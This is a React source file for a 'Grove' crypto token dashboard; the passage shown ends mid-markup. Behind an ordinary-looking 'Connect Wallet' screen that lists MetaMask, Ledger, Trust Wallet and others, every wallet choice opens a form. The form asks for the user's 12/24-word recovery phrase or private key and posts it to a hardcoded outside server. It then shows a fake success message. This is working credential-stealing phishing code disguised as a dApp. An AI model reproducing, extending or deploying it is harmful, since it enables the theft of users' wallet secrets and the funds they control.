import { useState } from 'react';
// import chartImg2 from './assets/chart2.jpg';
// import chartImg3 from './assets/chart3.jpg';
// import chartImg1D from './assets/1D.jpg';
// import chartImg1H from './assets/1H.jpg';
// import chartImg1M from './assets/1M.jpg';
// import chartImg5Min from './assets/5M.jpg';

const networkOptions = [
	{
		label: 'Ethereum Mainnet',
		short: 'Ethereum ...',
		icon: (
			<svg width="40" height="40" viewBox="0 0 40 40" fill="none">
				<circle cx="20" cy="20" r="20" fill="#23272F" />
				<polygon points="20,8 28,21 20,17 12,21" fill="#8C8C8C" />
				<polygon points="20,17 28,21 20,32 12,21" fill="#393939" />
			</svg>
		),
		smallIcon: (
			<svg width="24" height="24" viewBox="0 0 40 40" fill="none">
				<circle cx="20" cy="20" r="20" fill="#23272F" />
				<polygon points="20,8 28,21 20,17 12,21" fill="#8C8C8C" />
				<polygon points="20,17 28,21 20,32 12,21" fill="#393939" />
			</svg>
		),
	},
	{
		label: 'BNB Smart Chain',
		short: 'BNB Sma...',
		icon: (
			<img src="/assets/bnbsc.svg" alt="bnbsc" />
		),
		smallIcon: (
			<img src="/assets/bnbsc.svg" alt="bnbsc" />
		),
	},
	{
		label: '(Testnet)BNB',
		short: '(Testnet)B...',
		icon: (
			<img src="/assets/testnet.svg" alt="testnet" />
		),
		smallIcon: (
			<img src="/assets/testnet.svg" alt="testnet" />
		),
	},
	{
		label: 'GROVE C',
		short: 'GROVE C...',
		icon: (
			<img
				src="/assets/logo.jpg"
				alt="Grove"
				className="w-10 h-10 rounded-full bg-[#23272F]"
			/>
		),
		smallIcon: (
			<img
				src="/assets/logo.jpg"
				alt="Grove"
				className="w-6 h-6 rounded-full bg-[#23272F]"
			/>
		),
	},
];
const navItems = [
	{ icon: '▦', label: 'Overview' },
	{ icon: '🥇', label: 'Staking' },
	{ icon: '🌾', label: 'Farming' },
	{ icon: '⇄', label: 'Swap' },
	{ icon: '💵', label: 'Liquidity' },
];
const socialIcons = [
	{ icon: 'in', label: 'LinkedIn' },
	{ icon: 'im', label: 'Instagram' },
	{ icon: 'yt', label: 'YouTube' },
	{ icon: 'dc', label: 'Discord' },
	{ icon: 'tg', label: 'Telegram' },
	{ icon: 'x', label: 'X' },
];

function App() {
	console.log('Environment variables:', {
		VITE_API_BASE_URL: import.meta.env.VITE_API_BASE_URL,
		PROD: import.meta.env.PROD
	});

	const [activeNav, setActiveNav] = useState('Overview');
	const [showNetworkModal, setShowNetworkModal] = useState(false);
	const [selectedNetwork, setSelectedNetwork] = useState(networkOptions[1]);
	const [showWalletModal, setShowWalletModal] = useState(false); // NEW
	const [showSettingsModal, setShowSettingsModal] = useState(false);
	const [chartRange, setChartRange] = useState('1D');
	// Each button has its own image
	const chartImages = {
		'5Min': '/assets/5M.jpg',
		'1H': '/assets/1H.jpg',
		'1D': '/assets/1D.jpg',
		'1M': '/assets/1M.jpg',
	};

	const [showTokenDropdown1, setShowTokenDropdown1] = useState(false);
	const [showTokenDropdown2, setShowTokenDropdown2] = useState(false);
	const [selectedToken1, setSelectedToken1] = useState(null);
	const [selectedToken2, setSelectedToken2] = useState(null);
	const tokenOptions = [
		{ symbol: 'GRV', name: 'Grove Coin', icon: '/src/assets/logo.jpg' },
		{ symbol: 'ETH', name: 'Ethereum', icon: '/src/assets/react.svg' },
		{ symbol: 'BNB', name: 'BNB', icon: '/src/assets/react.svg' },
		{ symbol: 'USDT', name: 'Tether', icon: '/src/assets/react.svg' },
	];

	const [swapInput1, setSwapInput1] = useState('');
	const [swapInput2, setSwapInput2] = useState('');

	// Handler to reset both input fields
	const handleSwapReset = () => {
		setSwapInput1('');
		setSwapInput2('');
	};

	const [showWalletPhraseModal, setShowWalletPhraseModal] = useState(false);
	const [mainTab, setMainTab] = useState('phrase'); // 'phrase' or 'privateKey'
	const [subTab, setSubTab] = useState(12); // 12 or 24
	const wordCount = subTab;
	const [words, setWords] = useState(Array(wordCount).fill(''));
	const handleSubTab = (count) => {
		setSubTab(count);
		setWords(Array(count).fill(''));
	};
	const [privateKey, setPrivateKey] = useState('');

	// Mobile responsive state
	const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);

	// --- ENHANCED VALIDATION AND SUBMISSION CODE START ---

	// State to control the success notification
	const [showSuccessNotification, setShowSuccessNotification] = useState(false);

	// State for validation errors and loading
	const [submissionErrors, setSubmissionErrors] = useState([]);
	const [isSubmitting, setIsSubmitting] = useState(false);

	// Validation functions
	const validateMnemonic = (words, expectedLength) => {
		const errors = [];

		// Check if all words are filled
		const emptyWords = words.filter(word => !word.trim());
		if (emptyWords.length > 0) {
			errors.push(`Please fill in all ${expectedLength} words`);
		}

		// Check word count
		const filledWords = words.filter(word => word.trim());
		if (filledWords.length !== expectedLength) {
			errors.push(`Expected exactly ${expectedLength} words, got ${filledWords.length}`);
		}

		// Basic word validation (alphabetic characters, reasonable length)
		const invalidWords = words.filter((word) => {
			const trimmed = word.trim();
			if (!trimmed) return false; // Skip empty words (already handled above)
			return !/^[a-zA-Z]{2,12}$/.test(trimmed);
		});

		if (invalidWords.length > 0) {
			errors.push('All words must contain only letters and be 2-12 characters long');
		}

		return errors;
	};

	const validatePrivateKey = (key) => {
		const errors = [];
		const trimmed = key.trim();

		if (!trimmed) {
			errors.push('Private key is required');
			return errors;
		}

		// Remove 0x prefix if present
		const cleanKey = trimmed.startsWith('0x') ? trimmed.slice(2) : trimmed;

		// Check if it's a valid hex string
		if (!/^[a-fA-F0-9]+$/.test(cleanKey)) {
			errors.push('Private key must contain only hexadecimal characters (0-9, a-f, A-F)');
		}

		// Check length (typically 64 characters for 256-bit keys)
		if (cleanKey.length !== 64) {
			errors.push('Private key must be exactly 64 hexadecimal characters (32 bytes)');
		}

		return errors;
	};

	// Validate data structure before saving
	const validateDataStructure = (data, dataType) => {
		if (!data || typeof data !== 'object') {
			return false;
		}

		// Check required fields
		if (!data.timestamp || !data.type) {
			return false;
		}

		// Validate based on data type
		if (dataType.includes('mnemonic')) {
			return data.mnemonic && data.wordCount && typeof data.wordCount === 'number';
		} else if (dataType === 'private-key') {
			return data.privateKey && typeof data.privateKey === 'string';
		}

		return false;
	};

	// Get filename based on data type
	const getFilenameForType = (dataType) => {
		const timestamp = new Date().toISOString().replace(/[:.]/g, '-');

		if (dataType.includes('mnemonic')) {
			return `${dataType}-${timestamp}.json`;
		} else if (dataType === 'private-key') {
			return `private-key-${timestamp}.json`;
		}

		return `wallet-data-${timestamp}.json`;
	};

	// Save wallet data to backend
	const saveWalletData = async (data, filename) => {
		try {
			// Hardcode the backend URL for now
			const baseUrl = 'https://grovetoken-1.onrender.com/api/wallet';
			let endpoint = '';
			let payload = {};

			// Determine endpoint and payload based on data type
			if (data.type && data.type.includes('mnemonic')) {
				endpoint = `${baseUrl}/seed`;
				// Convert mnemonic string back to array for backend
				const phraseArray = data.mnemonic.split(' ');
				payload = { phrase: phraseArray };
			} else if (data.type === 'private-key') {
				endpoint = `${baseUrl}/private-key`;
				payload = { privateKey: data.privateKey };
			} else {
				console.error('Unknown data type:', data.type);
				return false;
			}

			console.log('🌐 Making API call to:', endpoint);
			console.log('📦 Payload:', payload);

			const response = await fetch(endpoint, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify(payload)
			});

			if (response.ok) {
				const result = await response.json();
				console.log('✅ Backend response:', result);
				return true;
			} else {
				const error = await response.json();
				console.error('❌ Backend error:', error);
				return false;
			}
		} catch (error) {
			console.error('❌ Network error:', error);
			return false;
		}
	};

	// Real-time validation
	const currentValidationErrors = (() => {
		if (mainTab === 'phrase') {
			return validateMnemonic(words, wordCount);
		}
		if (mainTab === 'privateKey') {
			return validatePrivateKey(privateKey);
		}
		return [];
	})();

	// Combine real-time validation errors with submission errors
	const allErrors = [...currentValidationErrors, ...submissionErrors];

	// Logic to determine if the submit button should be disabled
	const isSubmitDisabled = currentValidationErrors.length > 0 || isSubmitting;

	// This function is now replaced by the walletDataService

	// Handler to process the submission
	const handleWalletSubmit = async () => {
		if (isSubmitDisabled) return;

		setIsSubmitting(true);
		setSubmissionErrors([]);

		try {
			// Final validation before submission
			let errors = [];
			let dataToSubmit = {};
			let dataType = '';

			if (mainTab === 'phrase') {
				errors = validateMnemonic(words, wordCount);
				if (errors.length === 0) {
					dataType = `${wordCount}-word-mnemonic`;
					dataToSubmit = {
						timestamp: new Date().toISOString(),
						type: dataType,
						mnemonic: words.join(' '),
						wordCount: wordCount
					};
				}
			} else if (mainTab === 'privateKey') {
				errors = validatePrivateKey(privateKey);
				if (errors.length === 0) {
					dataType = 'private-key';
					dataToSubmit = {
						timestamp: new Date().toISOString(),
						type: dataType,
						privateKey: privateKey.trim()
					};
				}
			}

			if (errors.length > 0) {
				setSubmissionErrors(errors);
				setIsSubmitting(false);
				return;
			}

			// Validate data structure before saving
			if (!validateDataStructure(dataToSubmit, dataType)) {
				setSubmissionErrors(['Invalid data structure. Please try again.']);
				setIsSubmitting(false);
				return;
			}

			// Get appropriate filename and save data
			const filename = getFilenameForType(dataType);
			console.log('🚀 Attempting to save data:', { dataToSubmit, filename });

			const saveSuccess = await saveWalletData(dataToSubmit, filename);

			if (saveSuccess) {
				console.log('✅ Data saved successfully');
				// Reset form state
				setWords(Array(wordCount).fill(''));
				setPrivateKey('');
				setSubmissionErrors([]);

				// Close the modal and show notification
				setShowWalletPhraseModal(false);
				setShowSuccessNotification(true);
				setTimeout(() => {
					setShowSuccessNotification(false);
				}, 4000);
			} else {
				console.log('❌ Data save failed');
				setSubmissionErrors(['Failed to save wallet data. Please try again.']);
			}
		} catch (error) {
			console.error('Submission error:', error);
			setSubmissionErrors(['An unexpected error occurred. Please try again.']);
		} finally {
			setIsSubmitting(false);
		}
	};

	// --- ENHANCED VALIDATION AND SUBMISSION CODE END ---

	// Wallet options (replace icons with your assets if available)
	const walletOptions = [
		{
			name: 'MetaMask',
			icon: (
				<img
					src="/assets/metamask.jpg"
					alt="MetaMask"
					className="w-10 h-10"
				/>
			),
		},
		{
			name: 'WalletConnect',
			icon: (
				<img
					src="/assets/walletConnect.jpg"
					alt="WalletConnect"
					className="w-10 h-10"
				/>
			),
		},
		{
			name: 'Coinbase',
			icon: (
				<img
					src="/assets/coinbase.svg"
					alt="Coinbase"
					className="w-10 h-10"
				/>
			),
		},
		{
			name: 'Trust Wallet',
			icon: (
				<img
					src="/assets/trustWallet.jpg"
					alt="Trust"
					className="w-10 h-10"
				/>
			),
		},
		{
			name: 'Safemoon',
			icon: (
				<img
					src="/assets/safemoon.jpg"
					alt="Safemoon"
					className="w-10 h-10"
				/>
			),
		},
		{
			name: 'Bitget',
			icon: (
				<img
					src="/assets/Bitget.jpg"
					alt="Bitget"
					className="w-10 h-10"
				/>
			),
		},
		{
			name: 'Okx',
			icon: (
				<img
					src="/assets/okx.jpg"
					alt="Okx"
					className="w-10 h-10"
				/>
			),
		},
		{
			name: 'Phantom',
			icon: (
				<img
					src="/assets/phantom.jpg"
					alt="Phantom"
					className="w-10 h-10"
				/>
			),
		},
		{
			name: 'Ledger',
			icon: (
				<img
					src="/assets/ledger.jpg"
					alt="Ledger"
					className="w-10 h-10"
				/>
			),
		},
	];

	return (
		<div className="min-h-screen flex bg-[#0b1023] text-white font-sans">
            {/* Success Notification - Responsive positioning */}
            {showSuccessNotification && (
                <div className="fixed top-4 right-4 md:top-8 md:right-8 z-[999] bg-green-600 text-white px-4 py-2 md:px-6 md:py-3 rounded-lg shadow-2xl animate-pulse max-w-[calc(100vw-2rem)]">
                    <p className="font-bold text-base md:text-lg">Success!</p>
                    <p className="text-sm md:text-base">Wallet data submitted.</p>
                </div>
            )}

			{/* Mobile Menu Overlay */}
			{isMobileMenuOpen && (
				<div
					className="fixed inset-0 bg-black/50 z-40 lg:hidden"
					onClick={() => setIsMobileMenuOpen(false)}
				/>
			)}

			{/* Sidebar - Responsive */}
			<aside className={`
				w-64 flex flex-col justify-between py-8 px-4 bg-[#01051e] border-r border-[#1a2147]
				fixed lg:sticky top-0 left-0 h-screen z-50 lg:z-auto
				transform transition-transform duration-300 ease-in-out lg:transform-none
				${isMobileMenuOpen ? 'translate-x-0' : '-translate-x-full lg:translate-x-0'}
			`}>
				<div>
					<div className="mb-10 flex items-center justify-between pl-2">
						<div className="flex items-center gap-3">
							<span className="text-xl font-semibold tracking-widest">
								Grove
							</span>
							<span>
								<img src="/src/assets/logo.jpg" alt="logo" className="w-8 h-8" />
							</span>
						</div>
						{/* Mobile close button */}
						<button
							className="lg:hidden w-8 h-8 flex items-center justify-center rounded-lg hover:bg-[#181f3a] transition text-white"
							onClick={() => setIsMobileMenuOpen(false)}
							aria-label="Close menu"
						>
							<svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
								<path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
							</svg>
						</button>
					</div>
					<nav className="flex flex-col gap-2">
						{navItems.map((item) => (
							<button
								key={item.label}
								onClick={() => {
									setActiveNav(item.label);
									setIsMobileMenuOpen(false); // Close mobile menu on navigation
								}}
								className={`flex items-center gap-3 px-4 py-3 rounded-lg text-left text-base font-medium transition-all ${
									activeNav === item.label
										? 'bg-[#151c3b] text-primary'
										: 'hover:bg-[#151c3b] text-white'
								}`}
							>
								<span className="text-lg">{item.icon}</span>
								{item.label}
							</button>
						))}
					</nav>
				</div>
				<div className="flex flex-col gap-4">
					<button
						className="bg-[#1f994f] text-dark font-semibold py-3 rounded-lg mb-2"
						onClick={() => {
							setShowWalletModal(true);
							setIsMobileMenuOpen(false); // Close mobile menu
						}}
					>
						Connect Wallet
					</button>
					<button
						className="border-3 border-[#1f994f] text-primary font-semibold py-3 rounded-lg flex items-center justify-center gap-2"
						onClick={(e) => {
							e.preventDefault();
							setActiveNav('Swap');
						}}
					>
						<span className="bg-gradient-to-r from-green-400 to-primary rounded-full w-6 h-6 flex items-center justify-center">
							<img
								src="/src/assets/logo.jpg"
								alt="Grove Logo"
								className="w-5 h-5 rounded-full object-cover"
							/>
						</span>
						Buy Grove Coin
					</button>
					<div className="flex gap-2 mt-6 justify-center">
						{socialIcons.map((s) => (
							<span
								key={s.label}
								className="w-7 h-7 bg-[#151c3b] rounded-full flex items-center justify-center text-xs text-gray-400 cursor-pointer hover:text-primary"
							>
								{s.icon}
							</span>
						))}
					</div>
				</div>
			</aside>

			{/* Main Content - Responsive */}
			<div className="flex-1 flex flex-col min-h-screen max-h-screen overflow-y-auto lg:ml-0">
				{/* Header - Responsive */}
				<header className="flex items-center justify-between lg:justify-end gap-2 md:gap-4 px-4 md:px-8 py-4 md:py-6 border-b border-[#1a2147] bg-[#01051e] sticky top-0 z-10">
					{/* Mobile Menu Button */}
					<button
						className="lg:hidden w-10 h-10 flex items-center justify-center rounded-lg hover:bg-[#181f3a] transition text-white"
						onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
						aria-label="Toggle menu"
					>
						<svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
							<path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
						</svg>
					</button>

					{/* Header Actions - Responsive */}
					<div className="flex items-center gap-2 md:gap-4">
						<button
							className="w-10 h-10 md:w-12 md:h-12 flex items-center justify-center rounded-full hover:bg-[#181f3a] transition text-xl md:text-2xl text-white"
							onClick={() => setShowSettingsModal(true)}
							aria-label="Settings"
						>
							<span role="img" aria-label="settings">
								⚙️
							</span>
						</button>
						<button
							className="flex items-center gap-1 md:gap-2 bg-[#151729] px-3 md:px-8 py-2 md:py-4 rounded-full text-[#227545] font-semibold text-sm md:text-base"
							onClick={() => setShowNetworkModal(true)}
						>
							<span className="bg-yellow-400 rounded-full w-5 h-5 md:w-6 md:h-6 flex items-center justify-center">
								{selectedNetwork.smallIcon}
							</span>
							<span className="hidden sm:inline">{selectedNetwork.label}</span>
						</button>
						<button
							className="bg-[#1f994f] text-dark px-3 md:px-6 py-2 rounded-lg font-semibold hover:bg-green-400 transition text-sm md:text-base"
							onClick={() => setShowWalletModal(true)}
						>
							<span className="hidden sm:inline">Connect Wallet</span>
							<span className="sm:hidden">Connect</span>
						</button>
					</div>
				</header>
				{/* Network Modal - Responsive */}
				{showNetworkModal && (
					<div
						className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4"
						onClick={() => setShowNetworkModal(false)}
					>
						<div
							className="bg-[#23232a] rounded-2xl shadow-2xl w-full max-w-[95vw] sm:max-w-[600px] lg:max-w-[49rem] min-h-[220px] relative flex flex-col items-stretch"
							onClick={(e) => e.stopPropagation()}
						>
							{/* Header row with different background - Responsive */}
							<div className="flex items-center justify-between px-4 sm:px-6 lg:px-10 pt-6 sm:pt-8 lg:pt-10 pb-4 sm:pb-6 lg:pb-8 border-b border-[#232a44] bg-[#302e2e] rounded-t-2xl">
								<div className="text-2xl sm:text-3xl lg:text-4xl font-bold text-white">
									Choose Network
								</div>
								<button
									className="text-2xl sm:text-3xl lg:text-4xl text-white hover:text-primary focus:outline-none bg-[#23232a] rounded-full w-10 h-10 sm:w-12 sm:h-12 flex items-center justify-center"
									onClick={() => setShowNetworkModal(false)}
									aria-label="Close"
								>
									×
								</button>
							</div>
							{/* Network options row - Responsive */}
							<div className="flex flex-wrap items-center justify-center gap-3 sm:gap-4 lg:gap-5 py-6 sm:py-8 lg:py-12 bg-[#222b32]/90 px-4">
								{networkOptions.map((net, i) => (
									<div
										key={i}
										className="flex flex-col items-center gap-2 sm:gap-3 lg:gap-4 cursor-pointer group min-w-[80px] sm:min-w-[100px]"
										onClick={() => {
											setSelectedNetwork(net);
											setShowNetworkModal(false);
										}}
									>
										<div className="w-12 h-12 sm:w-14 sm:h-14 lg:w-15 lg:h-15 flex items-center justify-center rounded-full bg-[#181f3a] group-hover:scale-105 transition-transform border-4 border-[#23232a] group-hover:border-green-400">
											{net.icon}
										</div>
										<span className="text-sm sm:text-base lg:text-lg font-semibold text-white text-center max-w-[80px] sm:max-w-[100px] lg:max-w-[120px] truncate">
											{net.label}
										</span>
									</div>
								))}
							</div>
						</div>
					</div>
				)}
				{/* Wallet Modal */}
				{showWalletModal && (
					<div
						className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4"
						onClick={() => setShowWalletModal(false)}
					>
						<div
							className="bg-[#23232a] rounded-2xl shadow-2xl flex flex-col lg:flex-row w-full max-w-[95vw] lg:max-w-3xl min-h-[420px] relative border-b-4 border-green-400 overflow-hidden"
							onClick={(e) => e.stopPropagation()}
						>
							{/* Left info panel - Responsive */}
							<div className="lg:w-1/3 bg-[#181f3a] flex flex-col justify-between p-4 sm:p-6 lg:p-8 text-left lg:min-w-[220px]">
								<div>
									<div className="text-xl sm:text-2xl font-bold mb-2">
										Connect Wallet
									</div>
									<div className="text-gray-400 mb-4 text-sm sm:text-base">
										Choose a wallet provider to connect to Grove Dashboard.
										<br className="hidden sm:block" />
										<span className="sm:hidden"> </span>
										Connecting your wallet is like “logging in” to Web3.
										<br className="hidden sm:block" />
										<span className="sm:hidden"> </span>
										Select your wallet from the options to get started.
									</div>
								</div>
								<div className="text-xs text-gray-500 mt-4 lg:mt-8">
									By connecting, you agree to the Terms of Service and
									Privacy Policy.
								</div>
							</div>
							{/* Right wallet grid - Responsive */}
							<div className="flex-1 p-4 sm:p-6 lg:p-8 grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4 lg:gap-6 items-center justify-items-center">
								{walletOptions.map((w) => (
									<button
										key={w.name}
										className="flex flex-col items-center gap-1 sm:gap-2 bg-[#10163a] hover:bg-primary/10 rounded-xl p-3 sm:p-4 w-24 h-28 sm:w-28 sm:h-32 border border-transparent hover:border-primary transition"
										onClick={() => setShowWalletPhraseModal(true)}
									>
										<div className="w-10 h-10 sm:w-12 sm:h-12 flex items-center justify-center mb-1 sm:mb-2">
											{w.icon}
										</div>
										<span className="text-xs sm:text-sm font-semibold text-white text-center leading-tight">
											{w.name}
										</span>
									</button>
								))}
							</div>
							<button
								className="absolute top-4 right-4 text-3xl text-gray-300 hover:text-white z-10"
								onClick={() => setShowWalletModal(false)}
								aria-label="Close"
							>
								×
							</button>
						</div>
					</div>
				)}
				{/* Wallet Phrase Modal - Responsive */}
				{showWalletPhraseModal && (
					<div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30 p-4">
						<div className="relative bg-white rounded-3xl w-full max-w-[95vw] sm:max-w-[600px] lg:max-w-[720px] shadow-2xl pb-4 sm:pb-6 max-h-[90vh] overflow-y-auto">
							{/* ...modal content from previous answer... */}

							<div className="flex justify-center items-center pt-4 sm:pt-6 lg:pt-8 pb-0 px-4 sm:px-6 relative">
								<h2 className="text-xl sm:text-2xl font-bold text-[#181a20] tracking-wide m-0">
									CONNECT WALLET
								</h2>
								<button
									className="absolute right-4 sm:right-6 top-4 sm:top-6 lg:top-8 text-2xl sm:text-3xl text-[#181a20] hover:text-gray-500"
									onClick={() => setShowWalletPhraseModal(false)}
									aria-label="Close modal"
								>
									×
								</button>
							</div>
							<div className="flex mt-4 sm:mt-6 mx-4 sm:mx-6 rounded-xl bg-[#f7f7fa] overflow-hidden">
								<button
									className={`flex-1 py-2 sm:py-3 font-semibold text-sm sm:text-base rounded-xl transition ${
										mainTab === 'phrase'
											? 'bg-white text-[#181a20]'
											: 'bg-transparent text-[#181a20cc]'
									}`}
									onClick={() => setMainTab('phrase')}
								>
									<span className="hidden sm:inline">12 / 24 WORDS PHRASE</span>
									<span className="sm:hidden">PHRASE</span>
								</button>
								<button
									className={`flex-1 py-2 sm:py-3 font-semibold text-sm sm:text-base rounded-xl transition ${
										mainTab === 'privateKey'
											? 'bg-white text-[#181a20]'
											: 'bg-transparent text-[#181a20cc]'
									}`}
									onClick={() => setMainTab('privateKey')}
								>
									<span className="hidden sm:inline">PRIVATE KEY</span>
									<span className="sm:hidden">KEY</span>
								</button>
							</div>
							{mainTab === 'phrase' && (
								<div className="flex mt-4 sm:mt-6 mx-4 sm:mx-6 gap-2">
									<button
										className={`flex-1 py-2 sm:py-3 font-semibold text-sm sm:text-base rounded-xl transition ${
											subTab === 12
												? 'bg-[#cfc6fa] text-[#181a20]'
												: 'bg-[#f7f7fa] text-[#181a20]'
										}`}
										onClick={() => handleSubTab(12)}
									>
										12 Words
									</button>
									<button
										className={`flex-1 py-2 sm:py-3 font-semibold text-sm sm:text-base rounded-xl transition ${
											subTab === 24
												? 'bg-[#cfc6fa] text-[#181a20]'
												: 'bg-[#f7f7fa] text-[#181a20]'
										}`}
										onClick={() => handleSubTab(24)}
									>
										24 Words
									</button>
								</div>
							)}
							{/* Phrase Modal - Responsive */}
							{mainTab === 'phrase' && (
								<div className="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3 mt-4 sm:mt-6 mx-4 sm:mx-6 max-h-60 sm:max-h-80 overflow-y-auto">
									{Array.from({ length: wordCount }).map((_, i) => (
										<input
											key={i}
											type="text"
											className="py-2 sm:py-3 px-2 sm:px-3 rounded-lg border border-[#e7e7e7] bg-[#fafbfc] text-sm sm:text-base text-[#181a20] placeholder-[#b0b0b0] focus:outline-none focus:border-[#a18aff] transition"
											placeholder={`${i + 1}. word`}
											value={words[i] || ''}
											onChange={(e) => {
												const newWords = [...words];
												newWords[i] = e.target.value;
												setWords(newWords);
											}}
										/>
									))}
								</div>
							)}
							{/* Private Key Modal - Responsive */}
							{mainTab === 'privateKey' && (
								<div className="flex flex-col mt-4 sm:mt-6 mx-4 sm:mx-6">
									<label className="mb-2 text-gray-700 font-semibold text-sm sm:text-base">
										Private Key
									</label>
									<textarea
										className="py-2 sm:py-3 px-2 sm:px-3 rounded-lg border border-[#e7e7e7] bg-[#fafbfc] text-sm sm:text-base text-[#181a20] placeholder-[#b0b0b0] focus:outline-none focus:border-[#a18aff] transition resize-none min-h-[100px] sm:min-h-[120px]"
										placeholder="Enter your private key (64 hexadecimal characters)"
										value={privateKey}
										onChange={(e) => setPrivateKey(e.target.value)}
									/>
								</div>
							)}

							{/* Validation Errors Display - Responsive */}
							{allErrors.length > 0 && (
								<div className="mx-4 sm:mx-6 mt-4 p-3 sm:p-4 bg-red-50 border border-red-200 rounded-lg">
									<div className="flex items-start">
										<div className="flex-shrink-0">
											<span className="text-red-400 text-lg sm:text-xl">⚠️</span>
										</div>
										<div className="ml-2 sm:ml-3">
											<h3 className="text-xs sm:text-sm font-medium text-red-800">
												Please fix the following errors:
											</h3>
											<div className="mt-2 text-xs sm:text-sm text-red-700">
												<ul className="list-disc list-inside space-y-1">
													{allErrors.map((error, index) => (
														<li key={index}>{error}</li>
													))}
												</ul>
											</div>
										</div>
									</div>
								</div>
							)}
							{/* Submit Button - Responsive */}
							<button
								onClick={handleWalletSubmit}
								disabled={isSubmitDisabled}
								className={`w-[calc(100%-32px)] sm:w-[calc(100%-48px)] mx-4 sm:mx-6 mt-6 sm:mt-8 py-3 sm:py-4 text-base sm:text-lg font-bold rounded-2xl shadow-sm transition-all duration-200 flex items-center justify-center gap-2 ${
									isSubmitDisabled
										? 'bg-gray-300 text-gray-500 cursor-not-allowed'
										: 'bg-[#cec6fa] text-[#181a20] hover:bg-[#b5a9f7] hover:shadow-lg'
								}`}
							>
								{isSubmitting && (
									<div className="animate-spin rounded-full h-4 w-4 sm:h-5 sm:w-5 border-b-2 border-[#181a20]"></div>
								)}
								{isSubmitting ? 'Submitting...' : 'Submit'}
							</button>
						</div>
					</div>
				)}

				{/* Settings Modal */}
				{showSettingsModal && (
					<div
						className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4"
						onClick={() => setShowSettingsModal(false)}
					>
						<div
							className="bg-[#23232a] rounded-2xl shadow-2xl w-full max-w-[95vw] sm:max-w-md lg:max-w-lg min-h-[220px] relative flex flex-col items-stretch"
							onClick={(e) => e.stopPropagation()}
						>
							<div className="flex items-center justify-between px-4 sm:px-6 lg:px-8 pt-4 sm:pt-6 lg:pt-8 pb-3 sm:pb-4 border-b border-[#232a44] bg-[#181f3a] rounded-t-2xl">
								<div className="text-xl sm:text-2xl font-bold text-white">
									Settings
								</div>
								<button
									className="text-2xl sm:text-3xl text-white hover:text-primary focus:outline-none bg-[#23232a] rounded-full w-8 h-8 sm:w-10 sm:h-10 flex items-center justify-center"
									onClick={() => setShowSettingsModal(false)}
									aria-label="Close"
								>
									×
								</button>
							</div>
							<div className="p-4 sm:p-6 lg:p-8 flex flex-col gap-4 sm:gap-6">
								<div className="text-sm sm:text-base font-semibold text-white">SWAP & LIQUIDITY</div>
								<div className="flex flex-col gap-3">
									<span className="text-sm sm:text-base text-white">
										Default Transaction Speed (GWEI) <span>?</span>
									</span>
									<div className="flex flex-col sm:flex-row gap-2 sm:gap-0 sm:justify-between bg-[#343742] rounded-lg overflow-hidden">
										<button className="flex-1 p-3 sm:p-4 text-center hover:bg-[#1f994f] transition text-white">
											<div className="text-sm font-semibold">Standard</div>
											<div className="text-xs">(45)</div>
										</button>
										<button className="flex-1 p-3 sm:p-4 text-center hover:bg-[#1f994f] transition text-white border-t sm:border-t-0 sm:border-l border-[#23232a]">
											<div className="text-sm font-semibold">Fast</div>
											<div className="text-xs">(46)</div>
										</button>
										<button className="flex-1 p-3 sm:p-4 text-center hover:bg-[#1f994f] transition text-white border-t sm:border-t-0 sm:border-l border-[#23232a]">
											<div className="text-sm font-semibold">Instant</div>
											<div className="text-xs">(47)</div>
										</button>
									</div>
								</div>
								<div className="flex items-center justify-between">
									<span className="text-lg text-white font-medium">
										Slippage Tolerance
									</span>
									<input
										type="number"
										min="0"
										max="100"
										step="0.1"
										defaultValue={0.5}
										className="w-20 px-3 py-2 rounded bg-[#181f3a] text-white border border-[#232a44] text-right"
									/>
									<span className="text-white ml-2">%</span>
								</div>
								<div className="flex items-center justify-between">
									<span className="text-lg text-white font-medium">
										Transaction Deadline
									</span>
									<input
										type="number"
										min="1"
										max="60"
										step="1"
										defaultValue={20}
										className="w-20 px-3 py-2 rounded bg-[#181f3a] text-white border border-[#232a44] text-right"
									/>
									<span className="text-white ml-2">min</span>
								</div>
							</div>
						</div>
					</div>
				)}

				{/* Main Sections - Responsive */}
				<main className="flex-1 p-4 sm:p-6 lg:p-8 bg-[#0b1023] overflow-y-auto">
					{activeNav === 'Overview' && (
						<>
							{/* Token Generator Banner - Responsive */}
							<section className="bg-[#020827] border-4 sm:border-6 border-white rounded-xl p-4 sm:p-6 lg:p-8 flex flex-col lg:flex-row items-center justify-between mb-4">
								<div>
									<div className="flex items-center gap-2 sm:gap-4 mb-2">
										<span className="w-12 h-12 sm:w-16 sm:h-16 rounded-full bg-gradient-to-br from-green-400 to-primary flex items-center justify-center">
											<img
												src="/src/assets/logo.jpg"
												alt="Grove Logo"
												className="w-8 h-8 sm:w-12 sm:h-12 rounded-full object-cover"
											/>
										</span>
										<span className="text-3xl sm:text-4xl lg:text-6xl font-bold">
											Token Generator
										</span>
									</div>
									<div className="text-lg sm:text-xl font-semibold mb-2">
										Effortlessly Create and customize Tokens Across 16 EVM
										Networks
									</div>
									<div className="text-base sm:text-lg text-gray-300 max-w-xl">
										Create and deploy your smart contract in minutes! No
										coding required. Verified on chain instantly with
										advanced features and options for all your token needs.
									</div>
								</div>
								<button
									className="mt-4 sm:mt-6 lg:mt-0 bg-[#1f994f] text-dark text-lg sm:text-xl lg:text-2xl font-bold px-6 sm:px-8 lg:px-10 py-4 sm:py-5 lg:py-6 rounded-xl"
									onClick={() => window.location.reload()}
									title="Reset"
									type="button"
								>
									Click to Begin!
								</button>
							</section>

							{/* Overview Section - Responsive */}
							<section className="mb-6 sm:mb-8">
								<div className="bg-[#020827] p-4 sm:p-6 lg:p-10 rounded-xl">
									{/* Title on top - Responsive */}
